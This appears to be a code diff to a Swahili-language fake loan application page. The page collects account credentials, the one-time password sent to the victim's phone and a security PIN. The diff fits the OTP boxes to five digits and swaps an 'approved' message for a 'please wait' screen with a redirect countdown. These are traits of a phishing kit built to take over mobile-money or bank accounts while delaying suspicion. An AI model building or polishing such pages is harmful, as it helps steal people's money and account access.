@@ -66,14 +66,13 @@
             <div id="credentials-spinner" class="spinner hidden"></div>
         </section>
 
-        <!-- Step 3: OTP Verification (6 Digits Numeric Only) -->
+        <!-- Step 3: OTP Verification (5 Digits Numeric Only) -->
         <section id="step-otp" class="card hidden">
             <div class="shield-icon">🛡</div>
             <h2>Thibitisha Akaunti Yako</h2>
-            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 6 (namba pekee) iliyotumwa kwenda namba yako ya simu.</p>
+            <p class="subtitle">Tafadhali ingiza namba ya OTP ya tarakimu 5 (namba pekee) iliyotumwa kwenda namba yako ya simu.</p>
             
             <div class="otp-inputs">
-                <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
                 <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
                 <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
                 <input type="text" inputmode="numeric" pattern="[0-9]*" maxlength="1" class="otp-box" />
@@ -100,16 +99,25 @@
             <button id="btn-verify-security-pin" class="btn-primary">Kamilisha</button>
         </section>
 
-        <!-- Step 5: Success State -->
+        <!-- Step 5: Waiting / Success State with Spinner & Countdown Banner -->
         <section id="step-success" class="card hidden text-center">
-            <div class="success-icon">✅</div>
-            <h2>Ombi Lako Limefanikiwa!</h2>
-            <p class="subtitle">Mkopo wako umeidhinishwa na kiasi cha <span id="approved-amount-text" class="highlight"></span> kimetumwa kwenye akaunti yako.</p>
-            <p class="success-note">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
+            <div id="success-icon-container" class="success-icon">
+                <div class="spinner-large"></div>
+            </div>
+            <h2 id="success-title">Maombi ya Mkopo Yamewasilishwa</h2>
+            <p id="success-subtitle" class="subtitle">Maombi yako ya mkopo yamewasilishwa. Tafadhali subiri idhini. Utapata ujumbe wa uthibitisho.</p>
+            
+            <div id="countdown-banner" class="countdown-banner">
+                <span>🔄 Unaelekezwa kwenye mfumo katika <strong id="countdown-timer">3</strong> s...</span>
+            </div>
+
+            <p id="success-note-box" class="success-note hidden">Rejesho lako la mwezi litakuwa <span id="success-monthly" class="highlight"></span>.</p>
+            
+            <button id="btn-finish" class="btn-primary hidden" style="margin-top: 15px;">Maliza</button>
         </section>
     </div>
 
     <script src="script.js"></script>
 </body>
-                    </html>
-                    
+    </html>
+                                                                                     
